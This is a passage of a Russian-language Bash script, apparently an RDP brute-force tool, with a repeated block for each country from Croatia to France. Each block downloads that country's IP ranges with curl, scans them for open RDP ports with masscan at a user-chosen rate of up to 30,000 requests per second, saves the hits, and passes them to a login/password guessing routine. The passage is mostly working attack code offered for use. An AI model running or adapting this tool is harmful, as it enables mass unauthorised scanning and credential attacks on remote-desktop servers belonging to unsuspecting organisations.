echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "46" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CROATIA+%28LOCAL+NAME%3A+HRVATSKA%29%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Croatia (LOCAL Name: Hrvatska)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "47" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CUBA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cuba://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "48" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CYPRUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cyprus://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "49" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CZECH+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Czech Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "50" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DENMARK |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Denmark://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "51" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DJIBOUTI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Djibouti://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "52" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DOMINICAN+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Dominican Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "53" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ECUADOR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ecuador://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "54" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EGYPT |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Egypt://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "55" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EL+SALVADOR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/El Salvador://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "56" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ERITREA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Eritrea://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "57" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ESTONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Estonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "58" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ETHIOPIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ethiopia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "59" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EUROPEAN+UNION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/European Union://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "60" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FAROE+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Faroe Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "61" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FIJI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Fiji://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "62" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FINLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Finland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "63" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRANCE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/France://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
